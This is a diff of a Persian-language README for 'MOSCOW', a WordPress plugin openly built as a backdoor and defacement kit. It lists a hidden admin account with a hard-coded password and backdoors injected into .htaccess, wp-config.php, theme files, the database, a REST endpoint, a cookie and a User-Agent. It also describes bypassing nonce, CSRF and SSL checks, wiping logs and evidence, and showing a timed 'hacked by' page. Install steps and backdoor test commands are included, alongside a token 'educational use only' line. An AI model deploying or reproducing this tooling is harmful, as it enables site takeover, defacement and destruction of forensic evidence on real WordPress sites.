+| 🔄 **مکانیسم خودتخریبی** | حذف خودکار بعد از ۵۰ ساعت با پاک‌سازی کامل ردپا |
+| 💀 **صفحه دیفیس** | صفحه دیفیس حرفه‌ای با تایمر شمارش معکوس |
+| 🧹 **پاک‌سازی ردپا** | حذف تمام لاگ‌ها، ورودی‌های دیتابیس و شواهد |
+| ⏰ **ماندگاری با کرون جاب** | وظایف زمانبندی شده برای حفظ دسترسی |
+| 🌐 **بک‌دور REST API** | آدرس مخفی برای اجرای دستورات از راه دور |
+| 🔑 **احراز هویت با کوکی** | ورود از طریق کوکی خاص |
+| 📁 **مدیریت فایل از راه دور** | مرور، ویرایش و حذف فایل‌ها از راه دور |
+| 💉 **تزریق کد** | تزریق کد در فایل‌های قالب و هسته وردپرس |
+| 🛡️ **دور زدن امنیت** | غیرفعال‌سازی ویژگی‌های امنیتی وردپرس |
+
+---
+
+## ⚡ ویژگی‌های کلیدی
+
+| ویژگی | توضیح | وضعیت |
+|-------|-------|--------|
+| **کاربر ادمین مخفی** | ایجاد کاربر `here_is_leo` با دسترسی ادمین | ✅ |
+| **حالت مخفی‌کاری** | پنهان‌سازی پلاگین از لیست ادمین | ✅ |
+| **غیرفعال‌سازی کاربران** | غیرفعال‌سازی تمام کاربران به جز ادمین بک‌دور | ✅ |
+| **صفحه دیفیس** | صفحه حرفه‌ای "هک شده توسط HERE IS LEO" | ✅ |
+| **تایمر شمارش معکوس** | شمارش معکوس ۵۰ ساعته با ۴۰ فکت امنیتی | ✅ |
+| **خودتخریبی** | حذف خودکار بعد از ۵۰ ساعت | ✅ |
+| **بک‌دور .htaccess** | تزریق بک‌دور در فایل `.htaccess` | ✅ |
+| **بک‌دور wp-config** | تزریق بک‌دور در فایل `wp-config.php` | ✅ |
+| **بک‌دور قالب** | تزریق کد در فایل `functions.php` قالب | ✅ |
+| **بک‌دور دیتابیس** | ایجاد جدول سفارشی در دیتابیس | ✅ |
+| **بک‌دور REST API** | آدرس مخفی `/wp-json/moscow/v1/backdoor` | ✅ |
+| **بک‌دور User-Agent** | دسترسی از طریق User-Agent `MOSCOW-BOT` | ✅ |
+| **بک‌دور کوکی** | احراز هویت از طریق کوکی `moscow_auth` | ✅ |
+| **بک‌دور پارامتر URL** | دسترسی از طریق پارامتر `moscow_admin` | ✅ |
+| **دور زدن Nonce** | دور زدن تأیید Nonce وردپرس | ✅ |
+| **دور زدن CSRF** | دور زدن محافظت CSRF وردپرس | ✅ |
+| **دور زدن SSL** | غیرفعال‌سازی بررسی SSL برای ارتباط با سرور C2 | ✅ |
+| **پاک‌سازی ردپا** | حذف تمام لاگ‌ها و شواهد | ✅ |
+| **حذف فایل پلاگین** | حذف فایل‌های پلاگین در زمان غیرفعال‌سازی | ✅ |
+
+---
+
+## 🛠️ نصب
+
+### 📥 روش ۱: آپلود دستی
+
+```bash
 1. فایل moscow.php را دانلود کنید
 2. در مسیر /wp-content/plugins/ آپلود کنید
 3. از پیشخوان وردپرس فعال کنید
 4. سایت به طور خودکار به صفحه دیفیس هدایت می‌شود
-روش ۲: کلون از گیت
-bash
+```
+
+### 📥 روش ۲: کلون از گیت
+
+```bash
 git clone https://github.com/here-is-leo/MOSCOW.git
 cd MOSCOW
 cp moscow.php /path/to/wordpress/wp-content/plugins/
-روش ۳: آپلود با FTP
-bash
+```
+
+### 📥 روش ۳: آپلود با FTP
+
+```bash
 1. از طریق FTP به سرور متصل شوید
 2. به مسیر /wp-content/plugins/ بروید
 3. فایل moscow.php را آپلود کنید
 4. پلاگین را فعال کنید
-🔑 اطلاعات ورود بک‌دور
-🔐 فارسی:
-اطلاعات	مقدار
-آدرس ادمین	your-site.com/wp-admin
-نام کاربری	here_is_leo
-رمز عبور	HEREISLEO@2026
-ایمیل	leo@here-is-leo.com
-نام نمایشی	HERE IS LEO
-آدرس بک‌دور	your-site.com/moscow
-بک‌دور اضطراری	your-site.com/lapsus-admin
-آدرس REST API	/wp-json/moscow/v1/backdoor
-احراز هویت با کوکی	moscow_auth
-بک‌دور User-Agent	MOSCOW-BOT
-پارامتر URL	?moscow_admin=MD5_HASH
-🚨 جزئیات قابلیت‌ها
-۱. 🔐 بک‌دور ادمین مخفی
-فارسی:
+```
 
-ایجاد کاربر ادمین مخفی here_is_leo
+---
 
-پنهان‌سازی کاربر از لیست کاربران ادمین
+## 🔑 اطلاعات ورود بک‌دور
 
-احراز هویت سفارشی با روش‌های مختلف
+| اطلاعات | مقدار |
+|---------|-------|
+| **آدرس ادمین** | `your-site.com/wp-admin` |
+| **نام کاربری** | `here_is_leo` |
+| **رمز عبور** | `HEREISLEO@2026` |
+| **ایمیل** | `leo@here-is-leo.com` |
+| **نام نمایشی** | `HERE IS LEO` |
+| **آدرس بک‌دور** | `your-site.com/moscow` |
+| **بک‌دور اضطراری** | `your-site.com/lapsus-admin` |
+| **آدرس REST API** | `/wp-json/moscow/v1/backdoor` |
+| **احراز هویت با کوکی** | `moscow_auth` |
+| **بک‌دور User-Agent** | `MOSCOW-BOT` |
+| **پارامتر URL** | `?moscow_admin=MD5_HASH` |
 
-ایمیل: leo@here-is-leo.com
+---
 
-۲. 🕵️ حالت مخفی‌کاری
-فارسی:
+## 🚨 جزئیات قابلیت‌ها
 
-پنهان‌سازی پلاگین از لیست پلاگین‌های وردپرس
+### ۱. 🔐 بک‌دور ادمین مخفی
 
-پنهان‌سازی کاربر ادمین از لیست کاربران
+- ایجاد کاربر ادمین مخفی `here_is_leo`
+- پنهان‌سازی کاربر از لیست کاربران ادمین
+- احراز هویت سفارشی با روش‌های مختلف
+- ایمیل: `leo@here-is-leo.com`
 
-مبهم‌سازی گزینه‌های دیتابیس
+### ۲. 🕵️ حالت مخفی‌کاری
 
-پاک‌سازی خودکار لاگ‌های فعالیت
+- پنهان‌سازی پلاگین از لیست پلاگین‌های وردپرس
+- پنهان‌سازی کاربر ادمین از لیست کاربران
+- مبهم‌سازی گزینه‌های دیتابیس
+- پاک‌سازی خودکار لاگ‌های فعالیت
+- مخفی‌سازی فعالیت کاربر
 
-مخفی‌سازی فعالیت کاربر
+### ۳. 📡 سیستم چندبک‌دوری
 
-۳. 📡 سیستم چندبک‌دوری
-نوع بک‌دور	مکان / روش
-بک‌دور ادمین	کاربر مخفی here_is_leo
-بک‌دور .htaccess	تزریق در فایل .htaccess
-بک‌دور wp-config	تزریق در فایل wp-config.php
-بک‌دور قالب	تزریق در فایل functions.php
-بک‌دور دیتابیس	جدول سفارشی دیتابیس
-بک‌دور REST API	/wp-json/moscow/v1/backdoor
-بک‌دور User-Agent	User-Agent MOSCOW-BOT
-بک‌دور کوکی	کوکی moscow_auth
-بک‌دور اضطراری	کوکی moscow_emergency
-پارامتر URL	?moscow_admin=MD5
-۴. 🔄 سیستم خودتخریبی
-فارسی:
+| نوع بک‌دور | مکان / روش |
+|------------|------------|
+| **بک‌دور ادمین** | کاربر مخفی `here_is_leo` |
+| **بک‌دور .htaccess** | تزریق در فایل `.htaccess` |
+| **بک‌دور wp-config** | تزریق در فایل `wp-config.php` |
+| **بک‌دور قالب** | تزریق در فایل `functions.php` |
+| **بک‌دور دیتابیس** | جدول سفارشی دیتابیس |
+| **بک‌دور REST API** | `/wp-json/moscow/v1/backdoor` |
+| **بک‌دور User-Agent** | User-Agent `MOSCOW-BOT` |
+| **بک‌دور کوکی** | کوکی `moscow_auth` |
+| **بک‌دور اضطراری** | کوکی `moscow_emergency` |
+| **پارامتر URL** | `?moscow_admin=MD5` |
 
-فعال شدن بعد از ۵۰ ساعت (قابل تنظیم)
+### ۴. 🔄 سیستم خودتخریبی
 
-غیرفعال‌سازی خودکار پلاگین
+- فعال شدن بعد از ۵۰ ساعت (قابل تنظیم)
+- غیرفعال‌سازی خودکار پلاگین
+- حذف تمام فایل‌های پلاگین
+- پاک‌سازی تمام ردپاهای دیتابیس
+- پاک‌سازی تمام لاگ‌ها
+- حذف کدهای تزریق شده از فایل‌های قالب
+- بازگرداندن سایت به حالت عادی
+- نمایش گزارش کامل خودتخریبی
 
-حذف تمام فایل‌های پلاگین
+### ۵. 🧹 پاک‌سازی ردپا
 
-پاک‌سازی تمام ردپاهای دیتابیس
+- پاک‌سازی فایل‌های `debug.log`
+- حذف فایل‌های `error_log`
+- حذف لاگ‌های خطای PHP
+- پاک‌سازی کش‌های دیتابیس
+- حذف تمام تنظیمات پلاگین
+- حذف جداول سفارشی دیتابیس
+- حذف کدهای تزریق شده از فایل‌های قالب
+- پاک‌سازی تزریق‌های `.htaccess`
+- پاک‌سازی تزریق‌های `wp-config.php`
 
-پاک‌سازی تمام لاگ‌ها
+### ۶. 💀 صفحه دیفیس
 
-حذف کدهای تزریق شده از فایل‌های قالب
+- طراحی حرفه‌ای "هک شده توسط HERE IS LEO"
+- تایمر شمارش معکوس ۵۰ ساعته با قابلیت شروع/توقف
+- ۴۰ فکت امنیتی (۲۵ طعنه + ۱۵ پند)
+- طراحی واکنش‌گرا برای موبایل با افکت‌های نئون
+- چرخش خودکار فکت‌ها هر ۲ دقیقه
+- انیمیشن تخریبی تایمر در لحظه صفر شدن
 
-بازگرداندن سایت به حالت عادی
+---
 
-نمایش گزارش کامل خودتخریبی
+## 🎨 پیش‌نمایش صفحه دیفیس
 
-۵. 🧹 پاک‌سازی ردپا
-فارسی:
-
-پاک‌سازی فایل‌های debug.log
-
-حذف فایل‌های error_log
-
-حذف لاگ‌های خطای PHP
-
-پاک‌سازی کش‌های دیتابیس
-
-حذف تمام تنظیمات پلاگین
-
-حذف جداول سفارشی دیتابیس
-
-حذف کدهای تزریق شده از فایل‌های قالب
-
-پاک‌سازی تزریق‌های .htaccess
-
-پاک‌سازی تزریق‌های wp-config.php
-
-۶. 💀 صفحه دیفیس
-فارسی:
-
-طراحی حرفه‌ای "هک شده توسط HERE IS LEO"
-
-تایمر شمارش معکوس ۵۰ ساعته با قابلیت شروع/توقف
-
-۴۰ فکت امنیتی (۲۵ طعنه + ۱۵ پند)
-
-طراحی واکنش‌گرا برای موبایل با افکت‌های نئون
-
-چرخش خودکار فکت‌ها هر ۲ دقیقه
-
-انیمیشن تخریبی تایمر در لحظه صفر شدن
-
-🎨 پیش‌نمایش صفحه دیفیس
-🖼️ فارسی:
-text
+```
 ╔═══════════════════════════════════════════╗
 ║              ╔══════════════╗             ║
 ║              ║    مسکو      ║             ║
@@ -602,9 +712,13 @@ text
 ║                                           ║
 ║   [ ► شروع ]                             ║
 ╚═══════════════════════════════════════════╝
-📁 ساختار فایل‌ها
-📂 فارسی:
-text
+```
+
+---
+
+## 📁 ساختار فایل‌ها
+
+```
 MOSCOW/
 ├── 📄 README.md                    # مستندات کامل
 ├── 📄 LICENSE                      # مجوز GPLv2
@@ -614,24 +728,38 @@ MOSCOW/
 └── 📁 screenshots/                 # دایرکتوری اسکرین‌شات‌ها
     ├── 🖼️ deface-preview.png       # پیش‌نمایش صفحه دیفیس
     └── 🖼️ admin-panel.png          # اسکرین‌شات پیشخوان ادمین
-⚙️ تنظیمات
-🔧 فارسی:
-تمام تنظیمات از طریق کلاس MOSCOW_Config در بالای فایل moscow.php مدیریت می‌شود:
+```
 
-تغییر اطلاعات بک‌دور:
-php
+---
+
+## ⚙️ تنظیمات
+
+تمام تنظیمات از طریق کلاس `MOSCOW_Config` در بالای فایل `moscow.php` مدیریت می‌شود:
+
+### تغییر اطلاعات بک‌دور:
+
+```php
 const ADMIN_USERNAME = 'here_is_leo';        // این را تغییر دهید
 const ADMIN_PASSWORD = 'HEREISLEO@2026';     // این را تغییر دهید
 const ADMIN_EMAIL = 'leo@here-is-leo.com';   // این را تغییر دهید
 const ADMIN_DISPLAY = 'HERE IS LEO';         // این را تغییر دهید
-تغییر آدرس بک‌دور:
-php
+```
+
+### تغییر آدرس بک‌دور:
+
+```php
 const BACKDOOR_URL = 'moscow';               // این را تغییر دهید
-تغییر زمان خودتخریبی:
-php
+```
+
+### تغییر زمان خودتخریبی:
+
+```php
 const SELF_DESTRUCT_HOURS = 50;              // این را تغییر دهید (ساعت)
-فعال/غیرفعال کردن قابلیت‌ها:
-php
+```
+
+### فعال/غیرفعال کردن قابلیت‌ها:
+
+```php
 const ENABLE_REDIRECT = true;                // فعال/غیرفعال کردن ریدایرکت
 const ENABLE_DEFACED_PAGE = true;            // نمایش صفحه دیفیس
 const ENABLE_USER_DEACTIVATE = true;         // غیرفعال‌سازی کاربران عادی
@@ -649,10 +777,15 @@ const INJECT_WPCONFIG = true;                // تزریق در wp-config.php
 const INJECT_HTACCESS = true;                // تزریق در .htaccess
 const INJECT_DATABASE = true;                // تزریق در دیتابیس
 const INFECT_ALL_FILES = false;              // پخش در تمام فایل‌ها (خطرناک!)
-🧪 تست
-🧬 فارسی:
-محیط تست محلی:
-bash
+```
+
+---
+
+## 🧪 تست
+
+### محیط تست محلی:
+
+```bash
 # با استفاده از Docker
 docker run -p 8080:80 wordpress:latest
 
@@ -661,15 +794,21 @@ docker run -p 8080:80 wordpress:latest
 
 # با استفاده از LocalWP
 # یک سایت وردپرس جدید ایجاد کنید
-صفحه دمو:
-bash
+```
+
+### صفحه دمو:
+
+```bash
 # در مرورگر باز کنید
 open Moscow.html
 
 # یا با Python هاست کنید
 python3 -m http.server 8000
-تست بک‌دورها:
-bash
+```
+
+### تست بک‌دورها:
+
+```bash
 # تست ورود ادمین
 https://your-site.com/wp-admin
 Username: here_is_leo
@@ -686,50 +825,13 @@ curl -A "MOSCOW-BOT" https://your-site.com/?cmd=phpinfo()
 
 # تست بک‌دور پارامتر URL
 https://your-site.com/?moscow_admin=MD5_HASH
-🤝 مشارکت
-🌟 فارسی:
-ما از مشارکت شما استقبال می‌کنیم! لطفاً این مراحل را دنبال کنید:
+```
 
-🍴 فورک کنید
+---
 
-🌿 ایجاد شاخه ویژگی (git checkout -b feature/AmazingFeature)
+## 📊 آمار
 
-💻 کامیت تغییرات (git commit -m 'Add some AmazingFeature')
-
-📤 پوش به شاخه (git push origin feature/AmazingFeature)
-
-🔄 باز کردن درخواست ادغام
-
-📜 مجوز
-📄 فارسی:
-این پروژه تحت مجوز GNU General Public License v2.0 منتشر شده است - برای جزئیات بیشتر فایل LICENSE را مشاهده کنید.
-
-شما آزاد هستید:
-
-✅ از نرم‌افزار برای پژوهش و آموزش استفاده کنید
-
-✅ کد را تغییر و تطبیق دهید
-
-✅ نسخه‌هایی از نرم‌افزار توزیع کنید
-
-شما باید:
-
-⚠️ اطلاعیه حق کپی رایت اصلی را حفظ کنید
-
-⚠️ کد منبع را افشا کنید
-
-⚠️ تغییرات اعمال شده را ذکر کنید
-
-📞 ارتباط
-🌐 فارسی:
-گیت‌هاب: @here-is-leo
-
-وب‌سایت: https://here-is-leo.ir
-
-ایمیل: leo@here-is-leo.com
-
-📊 آمار
-text
+```
 ╔═══════════════════════════════════════════╗
 ║           📊 آمار پروژه                   ║
 ╠═══════════════════════════════════════════╣
@@ -744,13 +846,69 @@ text
 ║   نسخه PHP مورد نیاز      :  ۷.۴+         ║
 ║   نسخه وردپرس مورد نیاز   :  ۵.۰+         ║
 ╚═══════════════════════════════════════════╝
-🏆 قدردانی
-👥 فارسی:
-توسعه‌دهنده: HERE IS LEO
+```
 
-تشکر ویژه: جامعه HACKFORCE
+---
 
-الهام‌گرفته از: تحقیقات امنیت سایبری و امنیت وردپرس
+## 🤝 مشارکت
 
-<p align="center"> <img src="https://readme-typing-svg.herokuapp.com/?font=Righteous&size=25&center=true&vCenter=true&width=500&height=50&duration=3000&lines=هک+شده+توسط+HERE+IS+LEO;پلاگین+مسکو;احترام+به+HACKFORCE" /> </p><p align="center"> <img src="https://img.shields.io/badge/🇷🇺-مسکو-red?style=for-the-badge" /> <img src="https://img.shields.io/badge/🔥-هک%20شده%20توسط%20HERE%20IS%20LEO-red?style=for-the-badge" /> <img src="https://img.shields.io/badge/💀-دیفیس-red?style=for-the-badge" /> </p><p align="center"> <b>⚠️ به خاطر داشته باش: قدرت بزرگ مسئولیت بزرگ می‌آورد ⚠️</b><br> <i>از این ابزار فقط برای اهداف آموزشی استفاده کنید</i> </p>
-<p align="center"> <b>Built with ❤️ by HERE IS LEO | ساخته شده با ❤️ توسط HERE IS LEO</b> </p>
+ما از مشارکت شما استقبال می‌کنیم! لطفاً این مراحل را دنبال کنید:
+
+1. 🍴 فورک کنید
+2. 🌿 ایجاد شاخه ویژگی (`git checkout -b feature/AmazingFeature`)
+3. 💻 کامیت تغییرات (`git commit -m 'Add some AmazingFeature'`)
+4. 📤 پوش به شاخه (`git push origin feature/AmazingFeature`)
+5. 🔄 باز کردن درخواست ادغام
+
+---
+
+## 📜 مجوز
+
+این پروژه تحت مجوز **GNU General Public License v2.0** منتشر شده است - برای جزئیات بیشتر فایل [LICENSE](LICENSE) را مشاهده کنید.
+
+### شما آزاد هستید:
+
+- ✅ از نرم‌افزار برای پژوهش و آموزش استفاده کنید
+- ✅ کد را تغییر و تطبیق دهید
+- ✅ نسخه‌هایی از نرم‌افزار توزیع کنید
+
+### شما باید:
+
+- ⚠️ اطلاعیه حق کپی رایت اصلی را حفظ کنید
+- ⚠️ کد منبع را افشا کنید
+- ⚠️ تغییرات اعمال شده را ذکر کنید
+
+---
+
+## 📞 ارتباط
+
+- **گیت‌هاب**: [@here-is-leo](https://github.com/here-is-leo)
+- **وب‌سایت**: [https://here-is-leo.ir](https://here-is-leo.ir)
+- **ایمیل**: leo@here-is-leo.com
+
+---
+
+## 🏆 قدردانی
+
+- **توسعه‌دهنده**: HERE IS LEO
+- **تشکر ویژه**: جامعه HACKFORCE
+- **الهام‌گرفته از**: تحقیقات امنیت سایبری و امنیت وردپرس
+
+---
+
+<div align="center">
+
+<img src="https://readme-typing-svg.herokuapp.com/?font=Righteous&size=25&center=true&vCenter=true&width=500&height=50&duration=3000&lines=هک+شده+توسط+HERE+IS+LEO;پلاگین+مسکو;احترام+به+HACKFORCE" />
+
+<img src="https://img.shields.io/badge/🇷🇺-مسکو-red?style=for-the-badge" />
+<img src="https://img.shields.io/badge/🔥-هک%20شده%20توسط%20HERE%20IS%20LEO-red?style=for-the-badge" />
+<img src="https://img.shields.io/badge/💀-دیفیس-red?style=for-the-badge" />
+
+**⚠️ به خاطر داشته باش: قدرت بزرگ مسئولیت بزرگ می‌آورد ⚠️**  
+*از این ابزار فقط برای اهداف آموزشی استفاده کنید*
+
+**ساخته شده با ❤️ توسط HERE IS LEO**
+
+</div>
+
+</div>
